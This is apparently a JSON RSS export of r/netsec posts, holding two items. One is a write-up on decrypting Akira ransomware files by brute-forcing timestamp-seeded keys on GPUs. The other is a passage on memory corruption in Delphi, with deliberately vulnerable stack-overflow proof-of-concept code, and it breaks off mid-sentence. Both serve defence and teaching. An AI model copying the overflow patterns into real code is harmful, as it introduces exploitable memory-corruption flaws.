{"id":"sML2JBPsdAyS6VtxX1nYrwK8E9RQ5WvH1LNVbcmAV1wNnbFFD7qWbUHZZMepDPsG","title":"top scoring links : netsec","displayTitle":"Reddit - NetSec","url":"https://www.reddit.com/r/netsec/top/.rss?t=week","feedLink":"https://www.reddit.com/r/netsec/top/?t=week","isQuery":false,"isEmpty":false,"isHidden":false,"itemCount":18,"items":[{"title":"Decrypting Encrypted files from Akira Ransomware (Linux/ESXI variant 2024) using a bunch of GPUs","url":"https://tinyhack.com/2025/03/13/decrypting-encrypted-files-from-akira-ransomware-linux-esxi-variant-2024-using-a-bunch-of-gpus/","date":1741915620,"author":"/u/yohanes","guid":712,"unread":true,"content":"<p>I recently helped a company recover their data from the Akira ransomware without paying the ransom. I’m sharing how I did it, along with the full source code.</p><p>To clarify, multiple ransomware variants have been named Akira over the years, and several versions are currently circulating. The variant I encountered has been active from late 2023 to the present (the company was breached this year).</p><p>There was an earlier version (before mid-2023) that contained a bug, allowing Avast to create a decryptor. However, once this was published, the attackers updated their encryption. I expect they will change their encryption again after I publish this.</p><p>You can find various Akira malware sample hashes at the following URL:</p><p>The sample that matches my client’s case is:</p><p><code>bcae978c17bcddc0bf6419ae978e3471197801c36f73cff2fc88cecbe3d88d1a</code></p><p>It is listed under the version: . The sample can be found on <a href=\"https://virus.exchange\">virus.exchange</a> (just paste the hash to search).</p><p>Note that the ransom message and the private/public keys will differ.</p><h2>We do this not because it is easy, but because we thought it would be easy</h2><p>I usually decline requests to assist with ransomware cases. However, when my friend showed me this particular case, a quick check made me think it was solvable.</p><p>From my initial analysis, I observed the following:</p><ul><li>The ransomware uses the current time (in nanoseconds) as a seed.</li><li>On my Linux machine, file modification times have nanosecond resolution.</li><li>They provided a screenshot of a partial log (), showing when the ransomware was executed, with millisecond resolution.</li></ul><p>Based on this, my initial thought was: <em>“This should be easy—just brute-force it by looking at the file timestamps. How hard can it be?”</em></p><p>I’ll explain in more detail, but it turned out to be more complicated than expected:</p><ul><li>The malware doesn’t rely on a single moment in time but uses , each with . The fist two and last two are related, so we can’t just bruteforce the time one by one. Key generation is complex, involving  for each timestamp. Each file ends up with a unique key.</li><li>The  only records file modification times with .</li><li>Not all  have millisecond resolution in their log files, some only log with second-level precision. I am still unsure what configuration file causes this different behavior</li><li>The malware uses  during execution.</li><li>The file modification time reflects , not when it is opened for writing.</li></ul><p>The code is written in , which is notoriously difficult to read, but fortunately, it wasn’t obfuscated. The binary is statically linked (a bit harder to analyze), but all strings are in cleartext. The error messages indicate that the  library is used, which made understanding the code much easier.</p><p>The code to generate random is like this (the actual code is in 0x455f40 in the binary)</p><div><pre title=\"\">void generate_random(char *buffer, int size)\n{\n    uint64_t t = get_current_time_nanosecond();\n    char seed[32];\n //in the real code, it uses C++ code to convert int to string\n    snprintf(seed, sizeof(seed), \"%lld\", t);\n    struct yarrow256_ctx ctx;\n    yarrow256_init(&amp;ctx, 0, NULL);\n    yarrow256_seed(&amp;ctx, strlen(seed), seed);\n    yarrow256_random(&amp;ctx, size, buffer);   \n}\n\n</pre></div><p>The random generator is implemented in . Here is the relevant code, with unnecessary parts removed. As noted in the comments:</p><blockquote><p>The number of iterations when reseeding, P_t in the yarrow paper. Should be chosen so that reseeding takes on the order of 0.1-1 seconds.</p></blockquote><div><pre title=\"\">void\nyarrow256_seed(struct yarrow256_ctx *ctx,\n\t       size_t length,\n\t       const uint8_t *seed_file)\n{\n  sha256_update(&amp;ctx-&gt;pools[YARROW_FAST], length, seed_file);\n  yarrow256_fast_reseed(ctx);\n}\n\nvoid\nyarrow256_fast_reseed(struct yarrow256_ctx *ctx)\n{\n  uint8_t digest[SHA256_DIGEST_SIZE];\n  unsigned i;   \n  sha256_digest(&amp;ctx-&gt;pools[YARROW_FAST], sizeof(digest), digest);\n  /* Iterate */\n  yarrow_iterate(digest);\n  aes256_set_encrypt_key(&amp;ctx-&gt;key, digest);\n  /* Derive new counter value */\n  memset(ctx-&gt;counter, 0, sizeof(ctx-&gt;counter));\n  aes256_encrypt(&amp;ctx-&gt;key, sizeof(ctx-&gt;counter), ctx-&gt;counter, ctx-&gt;counter); \n}\n\n/* The number of iterations when reseeding, P_t in the yarrow paper.\n * Should be chosen so that reseeding takes on the order of 0.1-1\n * seconds. */\n#define YARROW_RESEED_ITERATIONS 1500\n\n\nstatic void\nyarrow_iterate(uint8_t *digest)\n{\n  uint8_t v0[SHA256_DIGEST_SIZE];\n  unsigned i;\n  \n  memcpy(v0, digest, SHA256_DIGEST_SIZE);\n  \n  /* When hashed inside the loop, i should run from 1 to\n   * YARROW_RESEED_ITERATIONS */\n  for (i = 0; ++i &lt; YARROW_RESEED_ITERATIONS; )\n    {\n      uint8_t count[4];\n      struct sha256_ctx hash;\n  \n      sha256_init(&amp;hash);\n\n      /* Hash v_i | v_0 | i */\n      WRITE_UINT32(count, i);\n      sha256_update(&amp;hash, SHA256_DIGEST_SIZE, digest);\n      sha256_update(&amp;hash, sizeof(v0), v0);\n      sha256_update(&amp;hash, sizeof(count), count);\n\n      sha256_digest(&amp;hash, SHA256_DIGEST_SIZE, digest);\n    }\n}\n</pre></div><p>The ransomware calls the random generator four times:</p><div><pre title=\"\">generate_random(chacha8_key 32);\ngenerate_random(chacha8_nonce, 16);\ngenerate_random(kcipher2_key, 16);\ngenerate_random(kcipher2_key, 16);\n</pre></div><p>Each  call uses the current nanosecond timestamp as a seed. Therefore, there are  that need to be identified. The ransomware generates <strong>different keys for each file</strong>.</p><p>These keys are then saved at the <strong>end of the file as a trailer</strong>, encrypted with  and padded using .</p><p>The files are divided into , and a percentage of each block is encrypted. This percentage is defined by the ransomware’s  parameter. For each block:</p><ul><li>The first  are encrypted using .</li><li>The remaining bytes are encrypted using ..</li></ul><p>The following picture shows how a file is split. Note that, for very small files, knowing the Chacha8 key and IV isn’t necessary..</p><p>After studying various VMware filetypes (I will go deeper into this later), I am convinced that the most important files (flat VMDK and sesparse files) has a fixed header, and I can use that to attack the  encryption.</p><p>At this point, I didn’t analyze deeper. But I am sure that I can reverse engineer the rest of the algorithms later, specifically:</p><ul><li>How to split the file into blocks</li><li>How is the encryption performed across blocks, does it continue the stream?</li></ul><p>These details will be important later. However, for now, if we can’t successfully brute-force the timestamps, none of the other steps will matter.</p><p>The approach is as follows:</p><ol><li> ( and ).</li><li>Convert these timestamps into seeds and generate random bytes.</li><li>Use these bytes as the .</li><li>Encrypt known plaintext and compare the result with the known ciphertext from the encrypted file.</li></ol><ul><li>: Determine if brute-forcing is fast enough to be practical.</li><li>: Known plaintext is required for brute-forcing. </li><li><strong>Estimate the seed initialization time</strong>: We need to know when the encryption seed was initialized, at least with . This knowledge can reduce the brute-force scope to about .</li></ul><p>The simplest (but inefficient) way is to try all possible timestamp pairs where . The number of possible pairs is calculated as: N×(N−1)/2</p><p>With , that results in  possible pairs.</p><p>We need to optimize this. First we need to convert all the nanoseconds in a one-to random values:</p><ul><li>On my , I estimated a processing speed of 100,000 timestamp to random bytes calculations per second (utilizing all cores).</li><li>This means it would take about  (under ) to convert all timestamps to seed values.</li><li>Once converted, these values can be saved for reuse.</li><li>Later, I optimized the process using a , reducing the conversion time from <strong>3 hours to under 6 minutes</strong>.</li></ul><p>If we have a completely deterministic machine, without any interruption, we can run the malware, measure it, know the exact time between T3 and T4. But unfortunately we don’t have this:</p><ul><li>The malware uses multiple threads,</li><li>It runs on a machine that is not idle, the distance between T3 and T4 varies based on the scheduler and how busy the system at that time. </li><li>The code also calls a lot of C++ libraries, which allocates and deallocates objects and makes the execution time more unpredictable.</li></ul><ul><li>we need to enumerate t3 (1 billion values for each second)</li><li>we dont start at t3 + 1, but at t3 + start offset, since we know that seeding the value takes time (at least a million nanosecond on my machine), this is the ““</li><li>we assume that it will only take a few million nanosecond to until the next code is executed (remember: there can be interruptions because of the CPU scheduler, and there are several millions instructions executed). This is the “” value</li></ul><p>What we can do is to try to run the exact same code as the malware, collect timing data, and try to find a range that statistically makes sense. Using the same <a href=\"https://tinyhack.com/2024/11/18/patching-so-files-of-an-installed-android-app/\">technique that I use on my previous post</a>, instead of recreating the algorithm and running it, I just modified the malware and tested on several local machines that I have. The runtime varies quite a lot between machines.</p><p>My friend <a href=\"https://github.com/huhnscheibe\">Deny</a> went to the datacenter and did the test on the real hardware that was infected. The result is: the time range varies, and sometimes quite a lot. The normal range of the offset is around 2-4 million nanoseconds (so the offset range is 2 million), but the value varies from 1.5 – 5 million (total offset range is  4.5 million). </p><p>We still need to enumerate 4.5 quadrillion pairs, but this appears to be doable. If we have a system capable of running 50 million encryptions per second, the process would take a few hundred days. However, with 16 such systems, we could complete it in a few months on a CPU. By renting additional machines, we could speed up the process even further. Later, I optimized this using a GPU, achieving a significant speed improvement.</p><p>I wasn’t sure about how fast we can do Kicpher2, but a quick comparison with chacha, and some quick benchmarking shows that using CPU ony, I should be able to do at least millions of Kichper operations per second on my machine.</p><p>As explained before,  if  and  are correct, we will be able to decrypt the  of the file, and it will decrypt to a known plaintext.</p><p>Next lets check the feasibility of obtaining plaintext from different VMware files</p><p>For each file, we need a plaintext sample: the first 8 bytes of the file for KCipher2 (offset 0) and another 8 bytes starting from offset 65,535 (only for large files). Since each block of KCipher2 is 8 bytes, we should use an 8-byte plaintext. It is possible to use fewer bytes (by using bit masking), but this could increase the risk of false positives.</p><p>This is a raw disk file. If you’re lucky, this might be the only file you need to recover. However, if snapshots were made (as in this client’s case), the new data would be written to sesparse files.</p><p>To obtain the first 8 bytes of the flat VMDK, you’ll need to install the same OS that was used on the original VM. There are several variations of bootloaders used by different OS versions.</p><p>To determine which OS was used, check the corresponding VMX file. It should contain partially readable plaintext, allowing you to inspect the configuration for “guestOS”. You might find something like: guestOS=”ubuntu”. However, ideally, you already have documentation regarding which OS was used for each VM, so you don’t have to rely on this method.</p><p>For the bytes at position 65,535 (plaintext for Chacha8), it is almost always guaranteed to be zero, since the partition typically starts at a later sector.</p><p>If you create snapshots for your VM, there will be a SESPARSE file for each snapshots. We can see the file format from the QEMU source code.</p><p>The file header is , and at position 65,535, it should be 0x0 (at least, that’s what I observed in my analysis).</p><p>Other files are not critical for restoring a working VM, but for initial testing, understanding the time distribution can be helpful. If there are many small files with the same timestamp, it’s useful to know if they cluster within a specific timestamp range.</p><p>Here are some common file signatures to identify plaintexts:</p><ul><li>NVRAM files start with: 4d 52 56 4e 01 00 00 00</li><li>VMDK files (disk descriptor) start with the string: </li><li>.VMX files start with: </li><li>VMware log files have lines starting with the format: Since these files are partially readable, we can often guess the initial timestamp based on the beginning of the file (e.g., the  part of the log).</li></ul><p>By identifying plaintexts in these files, the next step is to narrow down the timestamp for accurate brute-forcing.</p><p>Now that we know brute-forcing is feasible and we have both plaintext and ciphertext, the next step is to determine when the encryption occurred for each file (since each file will have different keys).</p><p>The command used to run the malware is recorded in the shell.log file (including the setting for n, which defines how much of the file should be encrypted).</p><p>Some ESXi hosts provide millisecond resolution in their logs, while others only offer second-level precision. This log gives us the initial timestamp for when the malware started.</p><p>For example, if the log shows that the malware started at 10:00:01.500, we can safely ignore the first 500 million nanoseconds when brute-forcing, which helps narrow down the search range.</p><h4>Filesystem timestamp and modification time</h4><p>Unfortunately, ESXi file systems do not support nanosecond precision.</p><p>Another challenge is that the file modification time is recorded only when the file is closed. This means the recorded timestamp might not exactly reflect the moment when the encryption process started but rather when it ended.</p><p>For small files, encryption typically takes only a few milliseconds, so the timestamp will most likely reflect the exact second when the file was encrypted. The next step is to determine the encryption time for larger files, where the process takes longer and the timestamps may be less precise.</p><h4>Multithreaded  Encryption</h4><p>The malware uses multithreading, where each file is processed in a new thread, with a pool of workers limited by the number of CPU cores. This has both advantages and disadvantages.</p><p>If the malware targets a single directory and the number of files is less than the number of CPU cores, the process is straightforward—each file will have a timestamp that is very close to the others. On an ESXi machine, it’s common to have CPUs with a large number of cores (in this case, the server has 64 cores).</p><p>When checking for timestamps using:</p><div><pre title=\"\">find /vmfs/volumes -exec stat {} \\;\n</pre></div><p>we should be able to identify small files that were encrypted first. During brute-forcing, we can then check multiple files simultaneously for that specific moment in time.</p><p>Files processed first will have similar timestamps, but things become more complex for files processed later. For larger files, encryption can take seconds to minutes, and the modification time will reflect when the file was closed, which is significantly later than when the encryption key was actually generated.</p><p>The malware uses  for traversing directories and files. The iterator in  follows the order returned by , which is the same order observed when using commands like  or .</p><p>Let’s consider an example where we have 4 CPU cores and 8 files. If the files are tiny (less than 1 KB, such as VMDK descriptor files), their processing is almost instantaneous (within milliseconds). Here’s how the processing might look:</p><ul><li> each find and process  (, , ), while  finds a  (). All four files are processed . </li><li>Once  complete, they begin processing the  (, , ). However, these files are  and require . </li><li>While the other three threads are still working,   finishes processing the large  and starts working on the  (). As a result, the  of  will align with the  of .</li></ul><p>Now, imagine having hundreds of files—it becomes difficult to determine the exact processing order. However, one consistent observation is that the encryption start time for a file is likely to be the same or very close to the modification time of another file.</p><p>This is because, once a thread finishes processing and closes a file (thereby recording its modification time), it will immediately start processing the next available file. This creates a sequence where the encryption start time of one file is closely linked to the modification time of the previous file.</p><p>So given few hundred files and plenty of CPU cores, we may only have a list of a few seconds where the malware will start to generate the random keys. </p><p>So now we have the final part of the puzzle: we know  the encryption was performed.</p><p>While reviewing the client’s logs, I noticed some entries mentioning the use of NFS. However, after clarification, it was confirmed that NFS was used only for backups and was not affected. All relevant files were stored on local disks on the server.</p><p>If a network filesystem had been used, it would have complicated the process. If the network time between systems wasn’t perfectly synchronized, the timestamps might have been inaccurate or unreliable, further complicating the brute-force process.</p><p>The plan seemed solid, so the next step was to implement the code. I needed to confirm whether the encryption process worked exactly like the malware.</p><p>To test this, I patched the malware code to make the gettime function return a constant value of 0, ensuring predictable and consistent results during testing.</p><p>I focused on KCipher2 because not all files use the Chacha8 key, particularly small files. Although KCipher2 is a standard encryption algorithm, it’s not widely known, and I couldn’t find an optimized implementation for it.</p><p>During experimentation, I noticed that my results didn’t match the standard KCipher2 implementations available online. It turned out that the malware included a slight modification in the initialization vector and the encryption process, specifically involving endian swapping.</p><p>I’m not an expert in CUDA programming. About 10 years ago, I briefly experimented with it but couldn’t find a practical use case for the company I worked for at the time.</p><p>To accelerate development, I asked ChatGPT (o1) to port the code to CUDA. The code compiled successfully but produced incorrect results. It turned out that ChatGPT had slightly modified the numbers in the constant tables. After manually correcting these values, the code began to work.</p><p>Although the implementation ran, I suspected it was suboptimal, but I wasn’t able to get further optimization suggestions from ChatGPT (o1). At that point, I had two options: spend more time optimizing the code or proceed with the predicted offset range and refine the code along the way. I chose to start testing immediately and optimize as needed. Unfortunately, this approach turned out to be a waste of money, as it didn’t yield any successful results.</p><p>At the start of the project, I only had two RTX 3060 GPUs. One was dedicated to my Windows machine, so I could only use one GPU on my Mini PC (connected externally via Oculink). To improve performance, I decided to purchase an RTX 3090. The price in Thailand was still reasonable compared to the 4090 or higher models.</p><p>I tested the implementation by reading the key and IV from memory, encrypting zero blocks, and writing the results back to memory. The performance was disappointing, achieving only around 60 million encryptions per second. At this rate, the entire process would take about 10 years, clearly too slow for practical recovery.</p><p>I performed some manual optimizations by removing unnecessary code to improve performance:</p><ul><li>Only the first block is needed for brute force, so there was no need to handle additional blocks.</li><li>The code was simplified to only encrypt blocks of zeroes, reducing unnecessary processing.</li><li>Since only the first 8 bytes of the result were required, the rest of the output was ignored to minimize computation.</li></ul><p>After researching CUDA optimizations for AES, I discovered that using shared memory significantly improves performance, contrary to what ChatGPT suggested. Surprisingly, the extra steps involved in copying constant memory data to shared memory were negligible in terms of overhead but resulted in the code running several times faster.</p><p>Initially, I performed encryption on the GPU and matching on the host (CPU). However, this approach was slow, even when executed in parallel:</p><ul><li>generate encryption on GPU</li><li>Perform matching in a new thread and submit the next batch of work to the GPU.</li></ul><p>I found it much faster to avoid writing to memory altogether. Instead, the matching process is handled directly on the GPU, and no data is written to memory unless a match is found. This approach significantly reduced processing time and improved efficiency.</p><p>For each t3 and t4 combination, a match can occur for any file that shares the same second-level timestamp (but with different nanoseconds).</p><p>To improve efficiency, we can attempt to match multiple files simultaneously. However, if there are too many files to match, the process can slow down significantly. Currently, the number of files processed in parallel is hardcoded to 32 to maintain a balance between performance and efficiency.</p><p>I considered and implemented two ways to do the loop. For every t3 value, we could start a GPU kernel to check all offset ranges. However, this method is inefficient, as it would require launching the kernel a billion times, resulting in significant overhead..</p><p>Alternatively, we can launch a GPU kernel for each offset. Each kernel would then perform the necessary checks. This approach is much faster because it reduces the number of submissions to just the “offset range”, which is around 2 to 4.5 million jobs.</p><p>Initially, my approach was to submit a task to the GPU, wait for the result using , and then submit the next batch of work. However, this method proved to be slow.</p><ul><li>Submit work to the GPU, and if a match is found, simply mark it using a found flag.</li><li>Only call  to check results every 100 steps. If a match is found, the flag is reset to zero before proceeding.</li></ul><p>While this method significantly improved performance, there’s a slight possibility that if two offsets are very close (less than 100 steps apart), the code might miss one of them. Although this issue never occurred during my tests, I added an optional mode of loop. In this mode, the program reads a list of  offsets and ensures that nearby offsets are also checked manually to avoid missing any potential matches.</p><p>I believe that GPU experts could still find ways to further optimize my code. Currently, I’m achieving around 1.5 billion encryptions per second for KCipher2 on my RTX 3090.</p><ul><li>For testing 1 billion values with a single offset, it takes about 0.7 seconds, including the time to check for matches (with a maximum of 32 matches per batch).</li><li>Testing 2 million offsets would require approximately 16 days on a single GPU, or just 1 day using 16 GPUs.</li></ul><p>I also conducted tests using <a href=\"https://runpod.io?ref=uoolmxxd\">Runpod</a>, and the RTX 4090 turned out to be the ideal option. Although it’s about 60% more expensive than the 3090, it’s also 2.3 times faster.</p><ul><li>With a 4090, the same process would take around 7 days on a single GPU.</li><li>Using 16 GPUs, the process could be completed in just over 10 hours.</li></ul><p>From a cost perspective, the RTX 4090 is an excellent choice for this task due to several factors:</p><ul><li>Large memory is not required.</li><li>Floating-point operations are not needed.</li><li>The RTX 4090 offers a high number of CUDA cores, enhancing processing speed.</li><li>The rental price for an RTX 4090 is relatively low compared to other high-end GPUs.</li></ul><p>If the 4090 is unavailable, the 3090 is also a good alternative considering its price-to-performance ratio.</p><p>Initially, my client considered using Google Cloud Platform (GCP) machines and seeking a discount for a month-long rental. However, this option proved to be extremely expensive (costing tens of thousands of USD).</p><p>After some research, I found more cost-effective alternatives: Runpod and Vast.ai.</p><p>To brute force 1 second (1 billion nanosecond), with offset range of 2 million, it  will take 7 days. The cost for a RTX 4090 (at the time of this writing) is 0.69 USD/hour. It will cost around 116 USD to brute force a single second.  Renting 16 GPUs will have the work finished in around 10 hours, same cost, but faster.</p><p>Brute forcing with the range of 4.5 million (which is the range that we need) costs 261 USD. Depending on the number of encrypted files, you might need to brute force 10 or more seconds. If you have a lot of files to recover, weekly or monthly rent will be cheaper.</p><p>Note: These costs assume everything is executed perfectly. Any mistakes or the need to repeat processes can significantly increase costs.In total, including all my experiments and tests, I spent around $1,200.</p><p>Unlike runpod, when using vast.ai, you are renting a machine from some random person brokered by vast.ai. When doing the bruteforce, no sensitive data is sent, so privacy should not be a concern.</p><p>Using vast AI, the bruteforce cost  can be reduced to half, but this depends on your luck in obtaining the machine. The first few machines that I tested didn’t work (network timeout after around 10 minutes of waiting). I also had problem with pulling docker images from docker.io (I had to select another template from another docker repository).</p><p>Now that I found the value of t3 and t4, I can try to find the value for t1 and t2. The value of t1 must be less than t3, and the time offset is less than 10 million nanoseconds. This can be found quickly in minutes using a single GPU.</p><p>Here is the algorithm used to split the file into parts:</p><ul><li>enc_block_size: for every parts/blocks, this is how many bytes to encrypt. The first 0xFFFFF will be encrypted using KCipher2, and the rest using Chacha8</li><li>part_size: the size of the block</li><li>encrypted_parts: how many blocks to encrypt</li></ul><div><pre title=\"\">void compute_blocks(uint64_t filesize, \n    uint8_t percent,\n    uint64_t *enc_block_size,\n    uint64_t *part_size,\n    uint64_t *encrypted_parts)\n{\n    int parts = 3;\n    if ( percent &gt; 49u )\n        parts = 5;\n    uint64_t enc_size = filesize * (uint64_t)percent / 100;\n    *enc_block_size = enc_size / parts;\n    *encrypted_parts = parts - 1;\n    *part_size = (filesize - *enc_block_size * (*encrypted_parts)) / parts;  \n}\n</pre></div><p>The malware uses the 8 rounds variant of Chacha called chacha8, not Chacha20 as many sites reported.</p><ul><li>For kcipher2, we will encrypt the first 65535 bytes (yes, not 65536). It means that one byte will remain from the first block, and this needs to be used for the next block</li><li>For cacha20, we just throw away the rest of the encryption stream block when starting a new block</li></ul><p>To recover your files without paying, it is not as straightforward as running a generic decryptor. You will need to:</p><ul><li>obtain timestamps of your files</li><li>obtain ciphertext and plaintext for your files</li></ul><p>To be honest, I originally wrote this code for one-time use, specifically for this particular client. The shared code is filled with experimental logic, quick hacks, and lacks proper testing.</p><p>I don’t have the motivation to clean it up further, apart from removing some client-specific test cases and comments. It’s functional for the intended purpose.</p><p>The software I provided includes only the main brute-force and decryption components, intended to be used once you have the necessary timestamps.</p><p>I don’t have a dedicated system to manage multiple GPUs. Instead, I rely on basic shell scripting and a custom script that sends a Telegram message when a match is found. The code is “good enough for me” and simply “works for me.”</p><p>In essence, you’ll need a capable system administrator who understands the process and knows how to manage and troubleshoot the system effectively.</p><p>See README.md in the repository, it also has a sample config file to test that it works. Sample encrypted files and configuration files are also provided.</p><p>I hope you haven’t touched the files, because all hope of recovery will be gone if the timestamps are unknown. Use  to get the modification timestamp. Use <code>find /vmfs/volumes -exec stat {} \\; &gt; /tmp/stats.txt</code> to get the timestamp of everything.</p><p>The file  can help to figure out the minimum timestamp to use.</p><p>Obtain the ciphertext, as explained above:</p><ul><li>For flat-vmdk, you need to extract this from the exact OS that you use (including the exact instalation method, e.g: using BIOS/UEFI)</li><li>For sesparse file, use the header </li><li>For other files, see what I wrote above</li></ul><p>You can always just use an offset range of 1.5-5 million, but this may not be the correct range if your hardware is too fast or too slow. You can measure this by checking out the  folder and  folder on my github repository.</p><p>The first one only measures time ranges by calling the function directly. The second one is used to encrypt a directory, but it is patched so that it will write down the exact time when the timestamp is used as the seed to .</p><p>Create config files based on the ciphertext/plaintext and timestamp. You can create/split this manually, or use a script to generate it. My code doesn’t do any error checking, make sure the timestamp is in nanosecond format, make sure all plaintext and ciphertext values are correct.</p><p>If you want a very quick and easy setup, use runpod or other service. If you want to be cheap, use vast.ai, or run it on your own hardware (~ 1K USD for one RTX 3090, which you can resell later).</p><p>The first brute force is to find t3 and t4 for Kcipher. </p><p><code>./akira-bruteforce run2 config.json</code></p><p>Append GPU index if you have multiple GPUs</p><p><code>./akira-bruteforce run2 config.json 1</code></p><p>I suggest running it inside tmux, so you will be fine in the event of network disconnect.</p><p>If we are lucky, output.txt will be generated for each t3/t4 found.</p><p>This is not necessary for small files, but it is neede for big files. For each offset found, generate a config with the t3 found in the previous step. On my target machine, the distance between t1 and t3 is less than 10 million, and the t1 to t2 is  around 1.5 – 5 million. The brute force should only take around 10 minutes.</p><p>Note that the decryptor has the percentage hardcoded to 15 percent, so please change this before running the decryptor in case the attacker uses different value.</p><p>Once we have obtained the t1, t2, t3, and t4, run the decryptor:</p><p><code>./decrypt filename.vmdk &lt;t1&gt; &lt;t2&gt; &lt;t3&gt; &lt;t4&gt;</code></p><p>The decryption process is not optimized, so it will take a while to decrypt.</p><p>./anti-akira run config.json &lt;gpuindex&gt;</p><p>As explained above: this may take days, so please make sure:</p><ul><li>all the config files are good</li><li>You are using the correct GPU index</li><li>make sure everything is running</li><li>check with nvidia-smi (with runpod, we can also view the GPU status using the web)</li><li>make a notification system to alert you if output.txt is created/updated</li></ul><p>Probably 99.9% of the time when you get a ransomware, it won’t be recoverable without the key. But if you are lucky, sometimes it is possible to find a solution. It took me much longer than I anticipated to solve this, I thought that it would take a week, but it took me almost three weeks until we recover an entire set of VM files.</p><p>I also would like to add that I found a reddit thread about <a href=\"https://www.reddit.com/r/sysadmin/comments/1crmt10/we_are_the_team_behind_the_decryption_of_the/\">akira ransomware</a> , I wasn’t sure that the ransomware strain that I have is the same as theirs, and that is the reason why I just continue my own research and to open source it. I hope that my experience and code will be useful for someone else. </p><p>Everytime I wrote something about ransomware (in my Indonesian blog), many people will ask for ransomware help. Many people can’t even find the ransomware executable (just the encrypted file, which is not useful). Just checking if the ransomware is recoverable or not may take several hours with a lot of efforts (e.g: if the malware is obfuscated/protected). So please don’t ask me to do that for free. </p>","contentLength":31291,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jasfsv/decrypting_encrypted_files_from_akira_ransomware/"},{"title":"Memory Corruption in Delphi","url":"https://blog.includesecurity.com/2025/03/memory-corruption-in-delphi/","date":1741901379,"author":"/u/907jessejones","guid":800,"unread":true,"content":"<p><a href=\"https://includesecurity.com\">Our team at Include Security</a> is often asked to examine applications coded in languages that are usually considered “unsafe”, such as C and C++, due to their lack of memory safety functionality. Critical aspects of reviewing such code include identifying where bounds-checking, input validation, and pointer handling/dereferencing are happening and verifying they’re not exploitable. These types of vulnerabilities are often disregarded by developers using memory safe languages.</p><p>In 2023 the NSA published a paper on <a href=\"https://media.defense.gov/2023/Apr/27/2003210083/-1/-1/0/CSI_SOFTWARE_MEMORY_SAFETY_V1.1.PDF\">Software Memory Safety</a> that included Delphi/Object Pascal in a list of “memory safe” languages. The paper caveats the statement by saying:</p><blockquote><p>Most memory safe languages recognize that software sometimes needs to perform an unsafe memory management function to accomplish certain tasks. As a result, classes or functions are available that are recognized as non-memory safe and allow the programmer to perform a potentially unsafe memory management task.</p></blockquote><p>With that in mind, our team wanted to demonstrate how memory management could go wrong in Delphi despite being included on the aforementioned list and provide readers with a few tips on how to avoid introducing memory-related vulnerabilities in their Delphi code.</p><p>In this blog post, we take the first steps of investigating memory corruption in Delphi by constructing several simple proof-of-concept code examples that demonstrate memory corruption vulnerability patterns.</p><p>There’s also a free and open source IDE named <a href=\"https://www.lazarus-ide.org/\">Lazarus</a>, which uses the <a href=\"https://www.freepascal.org/\">Free Pascal</a> compiler, and aims to be Delphi compatible.</p><h3>Memory Corruption and Memory Safety</h3><p>We’d like to take a look at how memory corruption vulnerabilities could be introduced in languages other than C/C++, where such vulnerabilities are often discussed. This blog post takes the first steps in investigating what memory corruption vulnerabilities might look like in Delphi code by writing several proof-of-concept demonstrations of the types of memory corruption that often lead to vulnerabilities.</p><p>Delphi has been claimed to be a memory-safe language <a href=\"https://blogs.embarcadero.com/is-delphi-a-memory-safe-language/\">in some contexts</a> but we consider it similar to C++ in regards to memory safety. Object Pascal and Delphi <a href=\"https://docwiki.embarcadero.com/RADStudio/Athens/en/Pointers_and_Pointer_Types_(Delphi)\">support arbitrary untyped pointers</a> and <a href=\"https://docwiki.embarcadero.com/Libraries/Athens/en/System.Ptr\">unsafe pointer arithmetic</a>, which can intentionally or not lead to memory corruption. But rather than simply show that dereferencing an arbitrary pointer value could cause a crash, we wanted to demonstrate a couple of memory corruption patterns that commonly lead to vulnerabilities in software. The following examples were compiled in the RAD Studio Delphi IDE with all of the default compiler options.</p><h3>Stack-Based Buffer Overflow</h3><p>Let’s start by trying to write a simple stack-based buffer overflow in Delphi. Note that in these following examples, the code was compiled in Win32 mode, which was the default, though the general concepts apply to other platforms as well. Here’s our first attempt at a stack-based buffer overflow:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">procedure Overflow1;\nvar\n  ar: Array[0..9] of Byte;          // Fixed-length array on the stack\n  i: Integer;\nbegin\n  for i := 0 to 999 do\n  begin\n    ar[i] := $41;                   // Try to overflow the array\n  end;\nend;                                // If overflow happens, returns to $41414141\n</pre><p>We define an array of 10 bytes, and then try to write 1000 values to the array. When we compile and run this code, it raises an exception but doesn’t crash:</p><p>Why didn’t it crash? Since the array  is defined with a static length, the compiler can insert code that does bounds-checking at runtime whenever the array is indexed. Let’s take a look at the compiled procedure (disassembled in Ghidra):</p><p>The code tests that the index is less than or equal to 9 and if it’s not, it calls a function that raises the exception (CMP EAX, 0x9, JBE, CALL).</p><p>But wait, this was the application compiled in debug mode. What happens if we compile the application in release mode?</p><p>Ah! In release mode, the compiler didn’t include the array bounds check, and the code overwrote the return address on the stack. Shown above is the Delphi debugger after returning to . Here’s the release build code, again disassembled in Ghidra:</p><p>No bounds check in sight. Why not? The “<a href=\"https://docwiki.embarcadero.com/RADStudio/Athens/en/Range_checking\">Range checking</a>” (which is what caught the overflow in debug mode) and “<a href=\"https://docwiki.embarcadero.com/RADStudio/Athens/en/Overflow_checking_(Delphi)\">Overflow checking</a>” (which checks for integer overflows) compiler settings are disabled by default in release mode:</p><p>So here is a lesson: consider turning on all the “Runtime errors” flags in release mode when hardening a Delphi build. Of course, the added checks are likely disabled by default to avoid performance impacts.</p><p>But how easy is it to overflow a buffer with Range checking enabled? Well, the official Delphi documentation warns about memory corruption in a few of its system library routines:</p><p>Note that these are just the system library routines that clearly warn about memory corruption in their documentation; it’s not a comprehensive list of dangerous routines in Delphi.</p><p>Here’s an example that uses to cause a stack buffer overflow:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">procedure Overflow2;\nvar\n  ar1: Array[0..9] of Byte;        // Smaller array on the stack\n  ar2: Array[0..999] of Byte;      // Larger array on the stack\n  i: Integer;\nbegin\n  for i := 0 to 999 do\n  begin\n    ar2[i] := $41;                 // Fill ar2 with $41\n  end;\n  Move(ar2, ar1, SizeOf(ar2));     // Oops should have been SizeOf(ar1)\nend;                               // Returns to $41414141\n</pre><p>This time, we create two stack buffers, fill the bigger one with , then use to copy the bigger array into the smaller array. When we run this code, even the debug build with Range checking enabled 